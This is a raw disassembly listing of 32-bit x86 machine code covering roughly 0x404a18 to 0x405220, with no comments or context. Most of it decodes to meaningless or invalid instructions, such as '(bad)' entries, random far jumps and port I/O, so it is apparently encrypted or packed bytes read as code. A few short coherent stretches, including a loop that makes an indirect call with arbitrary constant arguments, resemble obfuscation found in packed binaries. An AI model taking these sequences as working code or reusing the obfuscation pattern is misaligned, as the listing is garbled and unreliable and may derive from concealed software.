  404a18:	adc    eax,0xc49578cd
  404a1d:	pop    ds
  404a1e:	iret   
  404a1f:	sub    ebp,ebx
  404a21:	mov    eax,0x635626c8
  404a26:	pop    ss
  404a27:	push   es
  404a28:	xchg   ebp,eax
  404a29:	cwde   
  404a2a:	dec    edi
  404a2b:	sub    al,0xb2
  404a2d:	(bad)  
  404a2e:	(bad)  [ebx]
  404a30:	add    edi,edi
  404a32:	inc    ebp
  404a33:	or     al,0xe9
  404a35:	ds stc 
  404a37:	(bad)  
  404a38:	(bad)  
  404a39:	jmp    0x404b7e
  404a3e:	cmp    eax,0xf1133703
  404a43:	xor    ebx,ecx
  404a45:	sar    DWORD PTR [edx+esi*1+0x9],1
  404a49:	cld    
  404a4a:	(bad)  [esi]
  404a4c:	mov    DWORD PTR [ecx+0x70702124],ecx
  404a52:	sbb    BYTE PTR [edi+0x70],bh
  404a55:	jo     0x404a22
  404a57:	pop    edi
  404a58:	(bad)  
  404a59:	(bad)  [ebx-0x10]
  404a5c:	shl    edi,1
  404a5e:	xchg   ebx,eax
  404a5f:	dec    edi
  404a60:	sbb    DWORD PTR [edi],0x63
  404a63:	fsubr  DWORD PTR [ebx-0x78174d2]
  404a69:	out    dx,al
  404a6a:	xchg   ebx,eax
  404a6b:	push   es
  404a6c:	cli    
  404a6d:	jnp    0x404a74
  404a6f:	pop    eax
  404a70:	int3   
  404a71:	icebp  
  404a72:	mov    eax,0xca9917a8
  404a77:	int3   
  404a78:	or     eax,0x8f76e69
  404a7d:	cdq    
  404a7e:	iret   
  404a7f:	sub    DWORD PTR [ebx-0x24b0963d],esp
  404a85:	pop    ecx
  404a86:	jle    0xd9584bf7
  404a8c:	jp     0x404a8b
  404a8e:	rcl    BYTE PTR [edi-0x7a3ba4ee],cl
  404a94:	(bad)  
  404a95:	pop    ecx
  404a96:	xchg   esi,eax
  404a97:	icebp  
  404a98:	clc    
  404a99:	mov    ds:0xf944e4e6,eax
  404a9e:	stos   DWORD PTR es:[edi],eax
  404a9f:	and    al,0xe5
  404aa1:	sti    
  404aa2:	mov    ah,0xd0
  404aa4:	mov    edi,eax
  404aa6:	stc    
  404aa7:	xchg   ebx,eax
  404aa8:	jne    0x404a33
  404aaa:	gs scas eax,DWORD PTR es:[edi]
  404aac:	rcl    DWORD PTR [edx+esi*4],0x2a
  404ab0:	add    ecx,0x38e94020
  404ab6:	pop    esp
  404ab7:	adc    ch,dl
  404ab9:	les    esi,FWORD PTR [edi-0x80]
  404abc:	pop    esp
  404abd:	pop    edi
  404abe:	arpl   sp,bp
  404ac0:	bound  esi,QWORD PTR [edi-0xe]
  404ac3:	inc    ebp
  404ac4:	data16 sub cl,ch
  404ac7:	cmp    ecx,DWORD PTR [edi+0x1b1a9de0]
  404acd:	or     BYTE PTR [esi],0xd5
  404ad0:	jle    0x404abb
  404ad2:	aaa    
  404ad3:	in     al,0xf
  404ad5:	add    DWORD PTR [ebp-0x28],ecx
  404ad8:	mov    BYTE PTR [edi],ah
  404ada:	repz je 0x404b4e
  404add:	repz call 0x6ac1:0x1ca28452
  404ae5:	push   ss
  404ae6:	cmp    DWORD PTR [esi-0x2b],ebx
  404ae9:	jnp    0x404b0b
  404aeb:	aad    0x27
  404aed:	mov    ebx,0xeeeb5fc0
  404af2:	xlat   BYTE PTR ds:[ebx]
  404af3:	(bad)  
  404af4:	popf   
  404af5:	inc    esp
  404af6:	outs   dx,BYTE PTR ds:[esi]
  404af7:	push   0x7c
  404af9:	jo     0x404b09
  404afb:	pop    ds
  404afc:	je     0x404af3
  404afe:	ins    DWORD PTR es:[edi],dx
  404aff:	push   edi
  404b00:	xor    BYTE PTR [edx+eax*2],dl
  404b03:	pop    ecx
  404b04:	or     cl,BYTE PTR [edi]
  404b06:	and    dl,BYTE PTR [ecx]
  404b08:	add    al,0x86
  404b0a:	jne    0x404aea
  404b0c:	int    0x54
  404b0e:	pop    esi
  404b0f:	ret    
  404b10:	jns    0x404b08
  404b12:	mov    eax,ds:0xa592672e
  404b17:	add    al,0x48
  404b19:	sbb    DWORD PTR [eax-0x56ef2745],0xffffffc9
  404b20:	jns    0x404b19
  404b22:	push   ss
  404b23:	jae    0x404ad5
  404b25:	sbb    al,0x1c
  404b27:	sbb    al,BYTE PTR [ecx-0x4e]
  404b2a:	arpl   WORD PTR [esi+0x7e870ee7],bx
  404b30:	bnd je 0x404abc
  404b33:	cmp    bl,BYTE PTR [ebx+0x522e5890]
  404b39:	arpl   cx,sp
  404b3b:	fcomp  DWORD PTR [ecx+0x3c]
  404b3e:	jae    0x404afc
  404b40:	pop    edx
  404b41:	ins    BYTE PTR es:[edi],dx
  404b42:	stos   DWORD PTR es:[edi],eax
  404b43:	jbe    0x404baa
  404b45:	or     al,0xf3
  404b47:	dec    edi
  404b48:	sub    al,0x23
  404b4a:	or     ah,BYTE PTR [ebx]
  404b4c:	out    dx,al
  404b4d:	test   eax,0xaf44f1d5
  404b52:	ficomp DWORD PTR [esi-0x64ef60cb]
  404b58:	daa    
  404b59:	fidivr DWORD PTR [ebp-0x56]
  404b5c:	sub    DWORD PTR [ebx-0x80],ebx
  404b5f:	inc    esp
  404b60:	test   eax,0x928bfc00
  404b65:	addr16 dec eax
  404b67:	ret    
  404b68:	ret    
  404b69:	sub    eax,0xb6b8955a
  404b6e:	mov    edi,0x8ec81f9
  404b73:	pop    es
  404b74:	adc    al,0x47
  404b76:	xlat   BYTE PTR ds:[ebx]
  404b77:	mov    esp,0xdbb3b993
  404b7c:	push   0xffffffac
  404b7e:	mov    eax,DWORD PTR [ebp-0x10]
  404b81:	xor    eax,ecx
  404b83:	mov    ecx,DWORD PTR [ebp+0x10]
  404b86:	add    eax,esi
  404b88:	jmp    0x404ccd
  404b8d:	pop    esi
  404b8e:	adc    BYTE PTR [esi-0x8],bh
  404b91:	mov    esi,0x9ce666a6
  404b96:	es icebp 
  404b98:	xor    eax,0xd5a406b7
  404b9d:	int3   
  404b9e:	and    BYTE PTR [eax+0x70],dh
  404ba1:	sbb    BYTE PTR [edi+0x70],bh
  404ba4:	jo     0x404bea
  404ba6:	cmp    BYTE PTR [edx+0x7ffc21b8],ch
  404bac:	cmp    ebp,DWORD PTR [ebx+0xa]
  404baf:	jno    0x404bc7
  404bb1:	lds    esi,FWORD PTR [eax-0x63]
  404bb4:	or     BYTE PTR [edx],dh
  404bb6:	inc    edi
  404bb7:	inc    esp
  404bb9:	pop    ss
  404bba:	add    cl,0x71
  404bbd:	jl     0x404be7
  404bbf:	jno    0x404b89
  404bc1:	push   edi
  404bc2:	call   0x28864d70
  404bc7:	mov    ebp,0xf79b1f9f
  404bcc:	es addr16 add al,0x43
  404bd0:	pop    edi
  404bd1:	xchg   esi,eax
  404bd2:	mov    al,ds:0xf33864be
  404bd7:	leave  
  404bd8:	int    0xb5
  404bda:	sti    
  404bdb:	lahf   
  404bdc:	cs ds push 0xea7ad46c
  404be3:	data16 in al,dx
  404be5:	imul   esi,DWORD PTR [esi+esi*8],0xb0d7eda0
  404bec:	mov    ecx,0xa0a9f3b
  404bf1:	dec    ebp
  404bf2:	and    bh,ch
  404bf4:	xor    DWORD PTR [ecx+0x56],eax
  404bf7:	sbb    eax,DWORD PTR [ebp+0x59]
  404bfa:	mov    ?,eax
  404bfc:	ror    BYTE PTR [eax+esi*8-0x15592fa9],cl
  404c03:	and    al,0x98
  404c05:	neg    DWORD PTR [eax+0x44]
  404c08:	ins    DWORD PTR es:[edi],dx
  404c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c0a:	add    DWORD PTR [ecx],edi
  404c0c:	adc    al,0x39
  404c0e:	loop   0x404c79
  404c10:	push   edx
  404c11:	and    eax,0xff6d27d5
  404c16:	and    edx,DWORD PTR [edx-0x30]
  404c19:	(bad)  
  404c1a:	jp     0x404bb7
  404c1c:	imul   dh
  404c1e:	test   DWORD PTR [ecx-0x63b2cf7],edx
  404c24:	test   al,0xf2
  404c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c27:	in     eax,dx
  404c28:	sbb    BYTE PTR [edi+0x365dd306],0xd9
  404c2f:	xchg   edi,eax
  404c30:	cld    
  404c31:	or     ch,BYTE PTR [esi+ebx*8+0x1a640ede]
  404c38:	hlt    
  404c39:	cmp    DWORD PTR [esi],0xd6c7bf9e
  404c3f:	jge    0x404bd5
  404c41:	adc    eax,0x7bc02e0f
  404c46:	mov    WORD PTR [eax-0x6133c658],?
  404c4c:	es xchg edi,eax
  404c4e:	jecxz  0x404cb8
  404c50:	inc    ebx
  404c51:	adc    edi,DWORD PTR [ecx+0x1bfe27ea]
  404c57:	int3   
  404c58:	inc    esp
  404c59:	jnp    0x404c63
  404c5b:	mov    al,0x9e
  404c5d:	bound  ebx,QWORD PTR [edi]
  404c5f:	jecxz  0x404c95
  404c61:	pop    edi
  404c62:	stos   BYTE PTR es:[edi],al
  404c63:	cmp    edx,esi
  404c65:	call   0x1d08:0xe71a94a6
  404c6c:	test   BYTE PTR [ecx+ebp*8-0x24],cl
  404c70:	jne    0x404c17
  404c72:	and    DWORD PTR [ebp+0x6],edx
  404c75:	div    DWORD PTR [edx+0x4bf8b6e3]
  404c7b:	cli    
  404c7c:	dec    edx
  404c7d:	push   ss
  404c7e:	pop    ds
  404c7f:	adc    BYTE PTR [esp+esi*4],dh
  404c82:	ror    BYTE PTR [edx+0x37],0x1b
  404c86:	inc    eax
  404c87:	mov    eax,ds:0x597962cc
  404c8c:	daa    
  404c8d:	xchg   ecx,eax
  404c8e:	cmp    ebp,edi
  404c90:	clc    
  404c91:	cmp    esi,ebp
  404c93:	aam    0xbb
  404c95:	xor    BYTE PTR [ecx+edx*8+0x3d7fc345],0xdb
  404c9d:	loope  0x404cea
  404c9f:	xor    dh,dl
  404ca1:	mov    dl,BYTE PTR [edx]
  404ca3:	mov    dl,0xeb
  404ca5:	sbb    ch,BYTE PTR [ebp-0xa]
  404ca8:	rcr    edx,0xad
  404cab:	mov    esp,0x2fb0390d
  404cb0:	mov    bl,0x17
  404cb2:	nop
  404cb3:	mov    cl,0x50
  404cb5:	push   cs
  404cb6:	push   0xffffff85
  404cb8:	(bad)  [esi-0x7f]
  404cbb:	jg     0x404c62
  404cbd:	test   DWORD PTR [ecx+eiz*8],ecx
  404cc0:	jmp    0xb796:0x1a264dcc
  404cc7:	sub    ebp,DWORD PTR [edx]
  404cc9:	(bad)  
  404cca:	mov    ecx,0x18920df
  404ccf:	pop    esi
  404cd0:	leave  
  404cd1:	ret    0xc
  404cd4:	push   ebp
  404cd5:	mov    ebp,esp
  404cd7:	push   ecx
  404cd8:	push   ecx
  404cd9:	sub    DWORD PTR ds:0x432cd6,0x432604
  404ce3:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  404cea:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  404cf1:	and    DWORD PTR ds:0x43427e,0x0
  404cfb:	xor    ecx,ecx
  404cfd:	add    ecx,DWORD PTR ds:0x43427e
  404d03:	inc    ecx
  404d04:	mov    DWORD PTR ds:0x43427e,ecx
  404d0a:	cmp    DWORD PTR ds:0x43427e,0x26
  404d11:	jne    0x404d52
  404d17:	push   DWORD PTR [ebp-0x20]
  404d1a:	push   DWORD PTR [ebp-0x24]
  404d1d:	push   0x434282
  404d22:	push   0x43428e
  404d27:	push   DWORD PTR [ebp-0x28]
  404d2a:	push   0x6ce4
  404d2f:	push   0x479e
  404d34:	push   DWORD PTR [ebp-0xc]
  404d37:	push   DWORD PTR [ebp-0x14]
  404d3a:	push   0x7cf9
  404d3f:	push   0x1b21
  404d44:	push   0x8797
  404d49:	push   DWORD PTR [ebp-0x24]
  404d4c:	call   DWORD PTR ds:0x432b32
  404d52:	cmp    DWORD PTR ds:0x43427e,0x1a
  404d59:	jb     0x404cfb
  404d5f:	neg    edx
  404d61:	mov    eax,DWORD PTR [ebp-0x4]
  404d64:	push   esi
  404d65:	xor    ecx,0x4a51
  404d6b:	mov    esi,DWORD PTR [ebp-0x8]
  404d6e:	mov    edx,0x7510855
  404d73:	xor    eax,edx
  404d75:	xor    esi,edx
  404d77:	mov    ecx,0x32729c
  404d7c:	adc    DWORD PTR ds:0x43431d,0x4006
  404d86:	jmp    0x40500a
  404d8b:	popa   
  404d8c:	sahf   
  404d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8e:	mov    fs,WORD PTR [ebx-0x6b]
  404d91:	jno    0x404e04
  404d93:	mov    al,ds:0x6119e646
  404d98:	jmp    0x7070:0x2ff46622
  404d9f:	fnstcw WORD PTR [esi+0x70]
  404da2:	jo     0x404d2e
  404da4:	lods   al,BYTE PTR ds:[esi]
  404da5:	stos   DWORD PTR es:[edi],eax
  404da6:	mov    bl,0xc3
  404da8:	nop    DWORD PTR [eax-0x9]
  404dac:	push   cs
  404dad:	jmp    0x404dde
  404daf:	mov    bl,0x32
  404db1:	mov    al,ds:0x977cf91d
  404db6:	enter  0xe335,0x80
  404dba:	lds    eax,FWORD PTR [ebx+0x30]
  404dbd:	fidiv  DWORD PTR [esi-0x5eaa5f0b]
  404dc3:	push   ebx
  404dc4:	cmp    BYTE PTR [edx],0x18
  404dc7:	jnp    0x404d9b
  404dc9:	out    dx,al
  404dca:	mov    dh,0xea
  404dcc:	cld    
  404dcd:	and    eax,0x78a3eb89
  404dd2:	sbb    BYTE PTR ds:0xfeeb2df1,0x5d
  404dd9:	sar    DWORD PTR [ecx+0x3b56f7bb],cl
  404ddf:	cmc    
  404de0:	sub    DWORD PTR [esi-0x49699919],esi
  404de6:	imul   esp,DWORD PTR [esp+ebx*2+0x13],0xe7892d1c
  404dee:	arpl   WORD PTR [eax],cx
  404df0:	cmc    
  404df1:	shr    DWORD PTR [edx-0x9234eec],0x17
  404df8:	bound  ecx,QWORD PTR [ebx+0x19]
  404dfb:	sar    DWORD PTR [edi-0x7b],cl
  404dfe:	sbb    esp,DWORD PTR [ecx-0x66]
  404e01:	fimul  DWORD PTR [ecx+0x76]
  404e04:	ja     0x404de8
  404e06:	jnp    0x404dce
  404e08:	xor    al,0xcb
  404e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0b:	sub    DWORD PTR [edi+esi*2],ebp
  404e0e:	nop
  404e0f:	stc    
  404e10:	cmp    DWORD PTR [esi+0x76],eax
  404e13:	jg     0x404e4d
  404e15:	add    dh,BYTE PTR [ebx+0x50]
  404e18:	inc    ebp
  404e19:	push   edi
  404e1a:	addr16 aas 
  404e1c:	cli    
  404e1d:	sbb    dl,BYTE PTR [edx+0xa]
  404e20:	cmc    
  404e21:	pop    es
  404e22:	push   ss
  404e23:	test   edi,esi
  404e25:	les    ebp,FWORD PTR [ebp+0x62c4c17c]
  404e2b:	add    cl,ch
  404e2d:	iret   
  404e2e:	fs mov ah,0x47
  404e31:	in     al,0x5c
  404e33:	retf   0x3a8e
  404e36:	xor    eax,0x217e14b9
  404e3b:	and    BYTE PTR [edi-0x9f37c7e],ch
  404e41:	jp     0x404e4e
  404e43:	pusha  
  404e44:	mov    ?,WORD PTR [ebp+0x1d683d7d]
  404e4a:	push   es
  404e4b:	cdq    
  404e4c:	(bad)  
  404e4e:	sbb    edi,ebp
  404e50:	push   ebx
  404e51:	xor    ecx,eax
  404e53:	sub    eax,0x575ac5e1
  404e58:	push   edi
  404e59:	xor    BYTE PTR [eax+0x5f8b8680],0x82
  404e60:	push   0xffffffe6
  404e62:	jle    0x404e33
  404e64:	mov    esi,0x7cb26cec
  404e69:	dec    ebx
  404e6a:	es add eax,0x1df850eb
  404e70:	mov    eax,DWORD PTR [esi]
  404e72:	(bad)  
  404e73:	or     edi,edx
  404e75:	(bad)  
  404e76:	mov    esp,0x956bb439
  404e7b:	add    bl,ah
  404e7d:	push   edi
  404e7e:	out    dx,eax
  404e7f:	mov    DWORD PTR ds:0xc70b9e8,ebp
  404e85:	lock jg 0x404ec1
  404e88:	test   eax,0x991619db
  404e8d:	or     ah,BYTE PTR [ebx+0x20]
  404e90:	movzx  ecx,WORD PTR [ebx-0x37]
  404e94:	outs   dx,BYTE PTR gs:[esi]
  404e96:	aaa    
  404e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e98:	iret   
  404e99:	hlt    
  404e9a:	jle    0x404e45
  404e9c:	mov    bl,0xc3
  404e9e:	adc    cx,WORD PTR [edi+0x583eb192]
  404ea5:	in     al,dx
  404ea6:	xchg   edx,eax
  404ea7:	cmc    
  404ea8:	sahf   
  404ea9:	(bad)  
  404eab:	mov    edx,0x94a3263d
  404eb0:	cmp    al,0xd5
  404eb2:	fucomp st(2)
  404eb4:	data16 loopne 0x404f26
  404eb7:	imul   esp,DWORD PTR [ebx+0x2b],0xfffffffb
  404ebb:	imul   ebx,DWORD PTR [eax],0xfb095132
  404ec1:	std    
  404ec2:	test   al,0x75
  404ec4:	xchg   dl,ch
  404ec6:	or     BYTE PTR [ebp+ebx*1+0x4cbb1c0d],ah
  404ecd:	stos   DWORD PTR es:[edi],eax
  404ece:	cli    
  404ecf:	adc    cl,BYTE PTR [ebx]
  404ed1:	jp     0x404f19
  404ed3:	mov    edx,DWORD PTR [ebp-0x6a01fae4]
  404ed9:	test   eax,0x6dac6328
  404ede:	(bad)
  404ee2:	sbb    eax,0x7b
  404ee5:	stos   DWORD PTR es:[edi],eax
  404ee6:	push   es
  404ee7:	mov    edi,0x3b4d3df2
  404eec:	xchg   ebx,eax
  404eed:	dec    edi
  404eee:	xchg   ebx,eax
  404eef:	in     eax,dx
  404ef0:	sbb    eax,0x4a5ffcbc
  404ef5:	adc    BYTE PTR [ebx],ch
  404ef7:	lahf   
  404ef8:	arpl   WORD PTR [edx],bp
  404efa:	jmp    0xe572:0x2a8072ce
  404f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f02:	mov    esi,0x19ef5c58
  404f07:	xor    bh,BYTE PTR [eax+0xb]
  404f0a:	push   ss
  404f0b:	addr16 and eax,0x4625eea7
  404f11:	scas   al,BYTE PTR es:[edi]
  404f12:	mov    ds:0xd97a7ed8,eax
  404f17:	sub    BYTE PTR [eax],dh
  404f19:	adc    cl,dl
  404f1b:	ins    DWORD PTR es:[edi],dx
  404f1c:	out    0x85,eax
  404f1e:	out    0x8d,al
  404f20:	mov    dh,0x13
  404f22:	mov    BYTE PTR [edi],dl
  404f24:	mov    ds:0x8d68c7d9,eax
  404f29:	xchg   ebp,eax
  404f2a:	push   eax
  404f2b:	test   al,0xa7
  404f2d:	pop    ds
  404f2e:	nop
  404f2f:	in     eax,0x74
  404f31:	pop    edi
  404f32:	out    dx,eax
  404f33:	dec    eax
  404f34:	push   ecx
  404f35:	iret   
  404f36:	sub    BYTE PTR [esi-0x2a0490d6],dh
  404f3c:	sub    DWORD PTR ds:0x83703c0e,0xffffff9b
  404f43:	cli    
  404f44:	(bad)  
  404f46:	inc    edi
  404f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f48:	ror    BYTE PTR [esp+edi*4+0x3a6e15f],1
  404f4f:	aaa    
  404f50:	pop    esp
  404f51:	js     0x404f29
  404f53:	xchg   ebp,eax
  404f54:	jb     0x404fa9
  404f56:	push   ds
  404f57:	cmp    al,0x8b
  404f59:	fisubr DWORD PTR [esi]
  404f5b:	mov    ch,0x94
  404f5d:	push   ds
  404f5e:	mov    al,0x7d
  404f60:	dec    esi
  404f61:	lods   al,BYTE PTR ds:[esi]
  404f62:	sub    bh,cl
  404f64:	popf   
  404f65:	xchg   ebx,eax
  404f66:	cs sahf 
  404f68:	push   edx
  404f69:	push   ebp
  404f6a:	xor    esi,0xa3b1f06b
  404f70:	sbb    ah,bh
  404f72:	sub    al,0xde
  404f74:	and    cl,BYTE PTR [eax-0x3]
  404f77:	jl     0x404fa5
  404f79:	std    
  404f7a:	lods   eax,DWORD PTR ds:[esi]
  404f7b:	inc    edx
  404f7c:	xchg   edx,eax
  404f7d:	sub    BYTE PTR [ebp+ebx*4-0x793f4d5a],dl
  404f84:	adc    DWORD PTR [bx+si+0x2],esp
  404f88:	push   edx
  404f89:	jmp    0xe57b4396
  404f8e:	ss jnp 0x404f3a
  404f91:	mul    BYTE PTR [edi]
  404f93:	mov    es,WORD PTR [esi]
  404f95:	ds ja  0x404f25
  404f98:	out    dx,al
  404f99:	ror    al,0x8f
  404f9c:	dec    esi
  404f9d:	fld    DWORD PTR [edi+edx*2+0x23233b85]
  404fa4:	xor    esp,DWORD PTR [ebx]
  404fa6:	xor    BYTE PTR [ecx+0x74604ffe],al
  404fac:	dec    ecx
  404fad:	(bad)  
  404faf:	es push ds
  404fb1:	fucom  st(4)
  404fb3:	push   ss
  404fb4:	sbb    ecx,DWORD PTR [edi-0x5a]
  404fb7:	ret    
  404fb8:	enter  0x99cd,0xfc
  404fbc:	out    0xb5,al
  404fbe:	xchg   ebp,eax
  404fbf:	fs jno 0x405000
  404fc2:	pushf  
  404fc3:	add    ch,BYTE PTR fs:[edi]
  404fc6:	enter  0x4892,0xf1
  404fca:	sbb    DWORD PTR [edx+0x5d7b75f4],edx
  404fd0:	mov    al,ds:0x262cbbf8
  404fd5:	add    DWORD PTR [edx],edx
  404fd7:	mov    dl,0xd5
  404fd9:	mov    dh,0xc0
  404fdb:	test   al,0x11
  404fdd:	dec    ecx
  404fde:	cmp    eax,0xaa869f09
  404fe3:	arpl   WORD PTR [esi],si
  404fe5:	ins    DWORD PTR es:[edi],dx
  404fe6:	ds out 0x71,al
  404fe9:	jno    0x404f98
  404feb:	push   ebx
  404fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fed:	add    DWORD PTR [ebx],ebp
  404fef:	add    ecx,DWORD PTR [eax+ecx*4-0x706caff5]
  404ff6:	inc    edx
  404ff7:	lahf   
  404ff8:	aas    
  404ff9:	test   al,0x82
  404ffb:	mov    bl,ch
  404ffd:	cmc    
  404ffe:	push   ebx
  404fff:	xor    al,0x54
  405001:	lahf   
  405002:	push   edx
  405003:	repnz mov al,0x5e
  405006:	lods   al,BYTE PTR ds:[esi]
  405007:	sbb    dh,BYTE PTR [ecx-0x5]
  40500a:	add    esi,ecx
  40500c:	xor    DWORD PTR ds:0x434296,0x260
  405016:	add    eax,ecx
  405018:	imul   eax,esi
  40501b:	mov    DWORD PTR ds:0x43428a,0x336a
  405025:	mov    esi,DWORD PTR [ebp+0xc]
  405028:	mov    DWORD PTR ds:0x434296,0x44f4
  405032:	cmp    esi,eax
  405034:	mov    DWORD PTR ds:0x432cca,0x3ddd
  40503e:	jne    0x4052de
  405044:	mov    eax,DWORD PTR [ebp-0x4]
  405047:	mov    esi,DWORD PTR [ebp-0x8]
  40504a:	xor    eax,edx
  40504c:	jmp    0x4052d0
  405051:	test   DWORD PTR [ebp+0xb],ebx
  405054:	cmp    al,0xf3
  405056:	push   0x55
  405058:	popa   
  405059:	and    DWORD PTR [esi],0x2f
  40505c:	adc    al,0x1d
  40505e:	push   edx
  40505f:	add    esi,DWORD PTR [esi]
  405061:	pop    ebp
  405062:	sub    eax,0x7ed97070
  405067:	jo     0x4050d9
  405069:	jecxz  0x405034
  40506b:	or     eax,0x7eac4388
  405070:	xor    BYTE PTR [edx+ebx*4-0x6],ch
  405074:	scas   al,BYTE PTR es:[edi]
  405075:	add    eax,0xc656594c
  40507a:	std    
  40507b:	sar    DWORD PTR [ecx+0xac3da02],1
  405081:	mov    ebp,0x43511919
  405086:	dec    ecx
  405087:	xchg   esp,eax
  405088:	and    BYTE PTR [esi],bh
  40508a:	sub    al,0xe3
  40508c:	jge    0x40509f
  40508e:	fwait
  40508f:	mov    edi,0x29c0d0e9
  405094:	xchg   dh,al
  405096:	xor    al,0x9f
  405098:	in     eax,dx
  405099:	cwde   
  40509a:	mov    esi,0xef755ba7
  40509f:	jl     0x4050ff
  4050a1:	mov    ds,WORD PTR [ecx+0x34]
  4050a4:	xchg   ebp,eax
  4050a5:	cmp    ebx,DWORD PTR [eax]
  4050a7:	jle    0x4050b3
  4050a9:	xchg   ecx,eax
  4050aa:	sub    ebx,DWORD PTR [esi+0x21]
  4050ad:	xor    eax,0x48caf3b3
  4050b2:	mov    esp,0xd22b1a8
  4050b7:	ds inc ebx
  4050b9:	or     edx,esi
  4050bb:	fisub  WORD PTR fs:[eax]
  4050be:	jge    0x40509f
  4050c0:	mov    esp,0x89cd1a9f
  4050c5:	sub    al,0x20
  4050c7:	cmp    bh,BYTE PTR [ebp+0x3ec41cde]
  4050cd:	pop    edi
  4050ce:	mov    esi,0x9b900996
  4050d3:	adc    DWORD PTR [ecx],esi
  4050d5:	push   eax
  4050d6:	add    DWORD PTR ds:[eax-0x28],eax
  4050da:	and    dh,BYTE PTR [ecx-0x40]
  4050dd:	pop    es
  4050de:	rcl    DWORD PTR [eax],0xb5
  4050e1:	lods   eax,DWORD PTR ds:[esi]
  4050e2:	xor    cl,dh
  4050e4:	adc    dl,BYTE PTR [edi+0x26]
  4050e7:	xlat   BYTE PTR ds:[ebx]
  4050e8:	ja     0x4050a4
  4050ea:	adc    al,0xed
  4050ec:	xor    al,BYTE PTR [ecx+ebp*4]
  4050ef:	inc    edi
  4050f0:	rcl    BYTE PTR [edi],0x3b
  4050f3:	or     BYTE PTR [ebx+eiz*1],0xcb
  4050f7:	adc    dh,bl
  4050f9:	jns    0x40513d
  4050fb:	out    dx,eax
  4050fc:	inc    edx
  4050fd:	mov    ds:0x97f7f272,eax
  405102:	or     eax,0x6d9f3b6b
  405107:	aad    0x90
  405109:	push   0x78bf9773
  40510e:	mov    ah,0xc
  405110:	mov    ebx,0x29b1d7db
  405115:	ficom  WORD PTR [eax]
  405117:	push   es
  405118:	push   0x4c
  40511a:	mov    cl,0xe
  40511c:	jecxz  0x4050db
  40511e:	dec    ecx
  40511f:	and    al,0x2
  405121:	(bad)  
  405122:	jo     0x40519d
  405124:	outs   dx,BYTE PTR ds:[esi]
  405125:	cwde   
  405126:	mov    dl,0x3a
  405128:	fs mov ah,0x71
  40512b:	(bad)  
  40512c:	es icebp 
  40512e:	and    cl,BYTE PTR [edi+eiz*4+0x11]
  405132:	or     esp,eax
  405134:	and    eax,0xd8aa44a3
  405139:	popa   
  40513a:	xor    DWORD PTR ds:0x7338f6ca,0x3c
  405141:	aad    0xae
  405143:	jb     0x405147
  405145:	pop    edx
  405146:	cmp    eax,esp
  405148:	and    BYTE PTR [ecx],cl
  40514a:	ror    bl,1
  40514c:	out    dx,al
  40514d:	sub    eax,0x3ac3891e
  405152:	cmc    
  405153:	push   esp
  405154:	add    al,0xef
  405156:	js     0x405186
  405158:	mov    dl,0xa
  40515a:	pop    ds
  40515b:	lahf   
  40515c:	or     edi,DWORD PTR [ebp-0x70791fbd]
  405162:	push   ebx
  405163:	dec    esi
  405164:	push   es
  405165:	arpl   WORD PTR [ebp-0x2a],bp
  405168:	out    0x7e,eax
  40516a:	pop    esp
  40516b:	dec    edi
  40516c:	in     al,dx
  40516d:	push   ebx
  40516e:	out    0x50,eax
  405170:	stos   DWORD PTR es:[edi],eax
  405171:	enter  0xc970,0x75
  405175:	(bad)  
  405176:	pop    ebx
  405177:	xor    DWORD PTR [ebp+edx*2+0xdce7dbe],esi
  40517e:	push   0xffffffcd
  405180:	inc    ebx
  405181:	pop    ss
  405182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405183:	push   ds
  405184:	mov    edx,0x8dbd2c03
  405189:	mov    ebx,0x1366a58b
  40518e:	push   ebp
  40518f:	adc    eax,DWORD PTR [edx]
  405191:	sub    dh,BYTE PTR [edi+0x45]
  405194:	inc    edx
  405195:	mov    ch,0x9d
  405197:	out    0xd,eax
  405199:	inc    esi
  40519a:	aaa    
  40519b:	mov    bh,0xbd
  40519d:	cld    
  40519e:	mov    al,ds:0x6ee8d737
  4051a3:	rcl    BYTE PTR [ebx],1
  4051a5:	out    dx,eax
  4051a6:	sbb    DWORD PTR [edi+0x3622cf95],0xe25c9278
  4051b0:	mov    eax,DWORD PTR [esi+0x325e1ae6]
  4051b6:	(bad)  
  4051b7:	(bad)  
  4051b8:	sub    dh,BYTE PTR [eax]
  4051ba:	das    
  4051bb:	in     al,0x66
  4051bd:	in     al,dx
  4051be:	cmp    cl,dl
  4051c0:	(bad)  
  4051c1:	or     esi,edx
  4051c3:	(bad)  
  4051c4:	lds    ecx,FWORD PTR [esi+0x421a599b]
  4051ca:	int3   
  4051cb:	jne    0x4051ce
  4051cd:	(bad)  
  4051ce:	ins    BYTE PTR es:[edi],dx
  4051cf:	dec    ebp
  4051d0:	arpl   di,bp
  4051d2:	pushf  
  4051d3:	jmp    0x4051ba
  4051d5:	mov    esi,0x3718ce8e
  4051da:	or     eax,0xe4db46f1
  4051df:	test   eax,0xb8407590
  4051e4:	call   0x7436:0xf1b62b87
  4051eb:	pop    ebx
  4051ec:	sbb    al,0xe7
  4051ee:	je     0x4051b3
  4051f0:	push   ebx
  4051f1:	pop    esp
  4051f2:	lods   eax,DWORD PTR ds:[esi]
  4051f3:	arpl   WORD PTR [ebp+0x59],di
  4051f6:	mov    bl,0x78
  4051f8:	jl     0x405181
  4051fa:	push   ds
  4051fb:	lods   al,BYTE PTR ds:[esi]
  4051fc:	int    0xf7
  4051fe:	mov    edi,esp
  405200:	arpl   si,bx
  405202:	sub    BYTE PTR ds:0xf82667ab,bh
  405208:	adc    eax,ebx
  40520a:	sub    al,BYTE PTR [ebx+eiz*1-0x41d3550]
  405211:	jmp    DWORD PTR [ecx-0x60]
  405214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405215:	shl    DWORD PTR [edi-0x2d1c0f05],cl
  40521b:	mov    ds:0xf924e76c,al
  405220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
